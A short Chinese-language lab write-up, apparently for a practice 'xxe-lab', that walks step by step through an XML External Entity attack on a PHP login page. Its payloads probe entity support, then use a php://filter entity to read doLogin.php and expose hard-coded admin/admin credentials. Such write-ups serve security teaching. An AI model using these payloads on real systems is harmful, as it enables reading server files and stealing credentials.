# xxe-lab

## php-xxe

进去看到登入界面

抓包发现是个xml的数据格式

查看是否能引用内部实体

```xml
<!DOCTYPE ANY [<!ENTITY test "hello">]><user><username>"&test;"</username><password>aaaa</password></user>
```

成功得到回显hello

检测服务器是否支持DTD引用外部实体

```xml
<!DOCTYPE ANY [<!ENTITY test SYSTEM "index.html">]><user><username>"&test;"</username><password>aaaa</password></user>
```

发现报错100多行处格式不符合,支持DTD引用外部实体

最终payload为

```xml
<!DOCTYPE ANY [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php">]><user><username>"&test;"</username><password>aaaa</password></user>
```

```php
$USERNAME = 'admin'; 
$PASSWORD = 'admin'; 
```

